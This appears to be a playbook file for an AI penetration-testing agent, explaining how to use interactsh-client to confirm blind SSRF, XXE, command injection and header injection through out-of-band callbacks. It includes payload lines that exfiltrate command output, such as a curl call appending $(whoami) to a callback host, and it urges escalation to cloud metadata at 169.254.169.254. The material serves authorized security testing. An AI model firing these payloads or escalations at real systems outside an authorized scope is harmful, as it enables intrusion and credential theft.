---
name: interactsh
description: Out-of-band (OAST) callback testing playbook with interactsh-client for confirming blind SSRF, blind XXE, blind RCE, blind SQLi, and async/webhook execution
---

# interactsh-client OAST Playbook

`interactsh-client` is preinstalled in the Pentesin sandbox (`/home/pentester/go/bin/interactsh-client`). Use it whenever a payload executes asynchronously or produces no direct HTTP response difference (blind SSRF, blind XXE, blind OS command injection, blind SSTI, header-based injection, email/PDF/webhook sinks).

## Quick Workflow

1. **Start a background listener writing JSONL logs:**
   ```bash
   interactsh-client -json -o /tmp/oast.jsonl -v > /tmp/oast.log 2>&1 &
   OAST_PID=$!
   sleep 3
   OAST_DOMAIN=$(grep -oE '[a-z0-9]{20,}\.[a-z0-9.-]+' /tmp/oast.log | head -n1)
   echo "OAST_DOMAIN=$OAST_DOMAIN"
   ```
2. **Tag every probe with a unique subdomain prefix** so you can correlate which endpoint/parameter triggered the callback:
   - `ssrf-webhook.<OAST_DOMAIN>`
   - `xxe-upload.<OAST_DOMAIN>`
   - `rce-header.<OAST_DOMAIN>`
   - `sqli-order.<OAST_DOMAIN>`
3. **Inject protocol-appropriate payloads:**
   - **Blind SSRF:** `http://ssrf-p1.<OAST_DOMAIN>/cb` and `https://ssrf-p1.<OAST_DOMAIN>/cb`
   - **Blind RCE:** `nslookup rce-p1.<OAST_DOMAIN>` or `curl -s http://rce-p1.<OAST_DOMAIN>/$(whoami)`
   - **Blind XXE:** external DTD / parameter entity referencing `http://xxe-p1.<OAST_DOMAIN>/dtd`
   - **Host / Header Injection:** `Host`, `X-Forwarded-Host`, `Referer`, `X-Api-Version` pointing at `hdr-p1.<OAST_DOMAIN>`
4. **Inspect captured callbacks & clean up:**
   ```bash
   sleep 5
   cat /tmp/oast.jsonl | jq -c '{protocol, full_id: .["full-id"], remote_address: .["remote-address"], timestamp}'
   kill "$OAST_PID" 2>/dev/null || true
   ```

## Validation & Escalation

- **DNS-only vs HTTP callback:** A DNS lookup proves resolution (e.g. blind SSRF / parser fetch); an HTTP callback with headers/User-Agent proves outbound HTTP capability and reveals backend library/cloud environment.
- **Prove real impact:** Do not stop at a bare DNS ping — use `suggest_exploit_chains` to pivot confirmed SSRF/XXE/RCE callbacks into cloud metadata (`169.254.169.254`), internal services, or command-output exfiltration.
- **Self-check:** Verify the `remote-address` belongs to the target infrastructure (not your own sandbox IP or a browser prefetch) before treating a callback as proof.
- **Fallback:** If outbound Interactsh servers are blocked by sandbox egress, note the block as an `open_proof_gap` rather than marking the candidate `ruled_out`.
